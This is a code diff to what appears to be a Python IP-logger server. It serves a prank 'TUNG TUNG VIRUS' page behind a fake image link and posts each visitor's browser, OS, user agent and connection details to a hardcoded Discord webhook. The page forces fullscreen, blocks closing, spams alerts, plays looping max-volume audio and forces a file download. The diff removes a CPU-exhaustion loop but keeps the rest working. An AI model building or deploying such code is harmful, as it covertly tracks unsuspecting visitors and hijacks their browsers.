@@ -6,51 +6,35 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QH
 
 FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"
 
-# Max annoying page + loud song + HEAVY CPU lag
+# Short & stable annoying page with loud Tung Tung song
 ANNOY_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>TUNG TUNG VIRUS</title>
-  <style>body{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}#overlay{position:fixed;inset:0;background:rgba(255,0,0,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}</style>
+  <title>TUNG TUNG</title>
+  <style>
+    body{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}
+    #overlay{position:fixed;inset:0;background:rgba(255,0,0,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}
+    h1{font-size:6em;animation:blink 0.3s infinite;}
+    @keyframes blink{0%,100%{opacity:1} 50%{opacity:0.1}}
+  </style>
 </head>
 <body>
   <div id="overlay">
-    <h1 style="font-size:6em;animation:blink 0.3s infinite;">TUNG TUNG VIRUS</h1>
-    <p style="font-size:2em;">Your browser is now mine...</p>
+    <h1>TUNG TUNG VIRUS</h1>
+    <p>LOUD MODE ACTIVATED 🔥</p>
   </div>
 
-  <!-- Loud Tung Tung Song -->
   <audio id="song" autoplay loop>
     <source src="https://www.myinstants.com/media/sounds/tung-tung-sahur.mp3" type="audio/mpeg">
   </audio>
 
   <script>
-    // Fullscreen
-    document.documentElement.requestFullscreen?.().catch(()=>{});
-
-    // Block closing
-    window.onbeforeunload = () => "TUNG TUNG says NO!";
-
-    // Spam alerts
-    setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 700);
-
-    // HEAVY CPU EATER (this lags the browser badly)
-    function cpuHell() {
-      while(true) {
-        for(let i = 0; i < 20000000; i++) {
-          Math.sin(i) * Math.cos(i) * Math.random();
-        }
-        setTimeout(cpuHell, 0);
-      }
-    }
-    cpuHell();
-
-    // Max volume song
+    // Loud Tung Tung song
     const audio = document.getElementById("song");
     audio.volume = 1.0;
-    audio.play().catch(()=>{});
+    audio.play().catch(() => { setTimeout(() => audio.play(), 300); });
 
     // Force GIF download
     const link = document.createElement('a');
@@ -59,6 +43,11 @@ ANNOY_HTML = """
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
+
+    // Annoying stuff
+    document.documentElement.requestFullscreen?.().catch(() => {});
+    window.onbeforeunload = () => "TUNG TUNG says NO!";
+    setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 800);
   </script>
 </body>
 </html>
@@ -78,7 +67,7 @@ Port: `{port}`
 Browser: {parsed.get('browser', {}).get('name', 'Unknown')}
 OS: {parsed.get('os', {}).get('name', 'Unknown')}
 UA: `{user_agent}`
-**Tung Tung + loud song + CPU hell activated!**"""
+**Tung Tung loud song activated!**"""
 
             requests.post(WEBHOOK_URL, json={"content": log})
 
